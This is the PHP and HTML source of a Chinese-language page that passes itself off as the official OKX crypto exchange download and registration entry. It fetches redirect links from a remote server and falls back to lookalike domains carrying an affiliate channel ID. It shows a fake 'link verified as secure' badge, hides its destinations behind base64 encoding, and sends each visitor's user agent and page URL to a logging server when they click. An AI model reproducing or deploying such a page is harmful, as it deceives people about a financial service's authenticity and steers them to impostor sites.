<?php
// 带Token的接口地址
$token = '9f2b7a4e1c8d5f6a3b0e9d4c7f123456';  // 之前定义的 Token
$url = "https://logs.okxapk.com/all/links.php?token={$token}";

// 远程请求带Token的接口
$linksJson = @file_get_contents($url);
$links = json_decode($linksJson, true);

// 如果接口调用失败，设置默认链接防止报错
if (!$links) {
    $links = [
           'web' => [
        'primary' => 'https://www.ouchyi.support/zh-hans/join?channelId=ACE529253',
        'backup1' => 'https://www.ouchyi.co/zh-hans/join?shortCode=Q7tTR4&channelId=ACE529253',
        'backup2' => 'https://www.ouzhyi.co/zh-hans/join?channelId=ACE529253'
    ]
    ];
}
 
$primaryUrl = $links['web']['primary'];
$backupUrl1 = $links['web']['backup1'];
$backupUrl2 = $links['web']['backup2'];
 
$encryptedPrimary = base64_encode($primaryUrl);
$encryptedBackup1 = base64_encode($backupUrl1);
$encryptedBackup2 = base64_encode($backupUrl2);

?>
<!DOCTYPE html>
<html lang="<?= htmlspecialchars($lang_code) ?>">
<head>
  <meta charset="UTF-8">
  <meta name="robots" content="index, follow">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, minimum-scale=1.0">
  <title>欧易 | App | OKX | 安卓版 | 苹果iOS版 | 电脑版 | 下载 | 官方入口 | 欧意</title>
  <link rel="icon" href="logo.png" type="image/x-icon" />
  <link rel="stylesheet" href="app.css" />
</head>
<body>
  <div class="container">
     <a href="" title="欧易下载平台" class="flex items-center space-x-2 hover:opacity-80 transition">
      <div class="logo">
        <img src="logo.png" alt="欧易 OKX App 下载中心" />
      </div>
     </a>  
   <div class="security-badge" id="securityBadge">
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentColor" style="width:1em; height:1em; vertical-align:middle; margin-right:0.3em;">
    <path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.857-9.809a.75.75 0 00-1.214-.882l-3.483 4.79-1.88-1.88a.75.75 0 10-1.06 1.061l2.5 2.5a.75.75 0 001.137-.089l4-5.5z" clip-rule="evenodd" />
  </svg>
    恭喜！链接已安全验证
</div>
    
    <h1>链接已通过安全验证</h1>
    <p>电脑以及苹果iOS版需注册后登录欧易官方中心下载</p>
    <div class="btn-group">
      <button class="btn btn-primary" onclick="startDownload(event, 'primary')">
         立即创建账户
        <span class="loader" id="loader1"></span>
      </button>
      
      <button class="btn btn-secondary" onclick="startDownload(event, 'backup1')">
         备用注册(一)
        <span class="loader" id="loader2"></span>
      </button>
      
      <button class="btn btn-tertiary" onclick="startDownload(event, 'backup2')">
         备用注册(二)
        <span class="loader" id="loader3"></span>
      </button>
    </div>
    <h4>若加载缓慢,可自行切换Wifi/5G网络刷新页面尝试</h4>
    <p class="notice">如果主通道无法进入，请尝试备用通道</p>
        <div class="btn-group" style="margin-top: 2rem;">
      <a href="/jump/c.php" class="btn btn-primary" target="_blank">
        立即下载安卓版
      </a>
      <a href="/" class="btn btn-secondary">
        返回首页
      </a>
    </div>
  </div>

 <script>
    const downloadConfig = {
      primary: { loaderId: 'loader1', token: '<?php echo $encryptedPrimary; ?>' },
      backup1: { loaderId: 'loader2', token: '<?php echo $encryptedBackup1; ?>' },
      backup2: { loaderId: 'loader3', token: '<?php echo $encryptedBackup2; ?>' }
    };

    function startDownload(event, type) {
      event.preventDefault();

      const config = downloadConfig[type];
      if (!config) return;

      const btn = event.currentTarget;
      const loader = document.getElementById(config.loaderId);

      btn.disabled = true;
      btn.classList.add('disabled');
      if (loader) loader.style.display = 'inline-block';

      try {
        const decodedUrl = atob(config.token);

        const downloadWindow = window.open('about:blank', '_blank');

        const logData = {
          type,
          source: window.location.origin + window.location.pathname + window.location.search,
          target: new URL(decodedUrl).hostname,
          ua: navigator.userAgent,
        };
        fetch('https://logs.okxapk.com/log/log_sigup.php', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(logData),
          keepalive: true,
        }).catch(() => {});

        downloadWindow.location.href = decodedUrl;

        setTimeout(() => {
          if (downloadWindow && !downloadWindow.closed) {
            downloadWindow.close();
          }
        }, 3000);

      } catch (e) {
        console.error('Download Lost:', e);
      }

      setTimeout(() => {
        btn.disabled = false;
        btn.classList.remove('disabled');
        if (loader) loader.style.display = 'none';
      }, 3000);
    }

    // 3S
    setTimeout(() => {
      const badge = document.getElementById('securityBadge');
      if (badge) {
        badge.style.transition = 'opacity 0.5s ease';
        badge.style.opacity = '0';
        setTimeout(() => {
          badge.style.display = 'none';
        }, 500);
      }
    }, 3000);
  </script>
</body>
</html>
